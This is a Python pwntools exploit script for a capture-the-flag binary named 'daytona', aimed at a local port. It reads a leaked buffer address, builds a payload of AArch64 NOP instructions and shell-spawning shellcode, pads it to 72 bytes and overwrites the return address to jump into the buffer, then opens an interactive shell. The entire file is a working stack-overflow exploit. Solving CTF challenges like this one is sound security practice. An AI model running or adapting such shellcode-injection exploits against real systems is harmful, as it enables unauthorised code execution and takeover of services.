import string
from pwn import *

exe = ELF('./daytona')
context.binary = exe

#p = exe.process()

p = remote('localhost', 25606)

#p = gdb.debug('/home/ditto/CTF-Challs/i95/Daytona/daytona', gdbscript='b *vuln+64')

p.recvuntil(b'going ')

leak = int(p.recvuntil(b' ').decode('utf-8')) + 0x75

info(f"[+] Buf @ {hex(leak)}")

nop = b'\x1f\x20\x03\xd5'

payload = nop * 0x4 + asm(shellcraft.sh()) #+ shellcraft.exit(0))

assert len(payload) <= 72

payload += b'A' * (72 - len(payload)) + p64(leak + 0x10)

print(hexdump(payload))
info(f"len(payload) = {len(payload)}")
for i, c in enumerate(payload):
    if c == ord('\n'):
        warning(f"Bad char at offset {i}: {hex(c)}")

p.recvuntil(b'??')

p.sendline(payload)

p.interactive()

